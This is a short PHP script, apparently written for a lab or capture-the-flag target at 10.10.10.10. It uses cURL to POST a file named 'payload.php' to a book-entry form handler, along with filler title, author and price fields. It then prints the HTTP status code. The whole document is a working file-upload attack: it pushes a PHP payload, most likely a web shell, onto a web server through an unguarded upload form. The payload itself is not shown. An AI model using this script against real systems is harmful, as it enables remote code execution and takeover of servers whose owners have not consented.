<?php
$target = 'http://10.10.10.10/form-action-location.php';
$c = curl_init($target);
$file = new CURLFile('payload.php', 'text/php', 'newfilename');

$data = [
    'name' => $file,
    'title' => 'my title',
    'author' => 'author name',
    'price' => 10,
    'publisher' => 1,
    'file' =>  'payload.php',
];

curl_setopt($c, CURLOPT_POST, 1);
curl_setopt($c, CURLOPT_POSTFIELDS, $data);
curl_setopt($c, CURLOPT_RETURNTRANSFER, TRUE);
curl_setopt($c, CURLOPT_FOLLOWLOCATION, TRUE);
curl_exec($c);

if (curl_errno($c)) {
    print_r("ERROR: " . curl_error($c));
}
else {
    print_r(curl_getinfo($c, CURLINFO_HTTP_CODE));
}
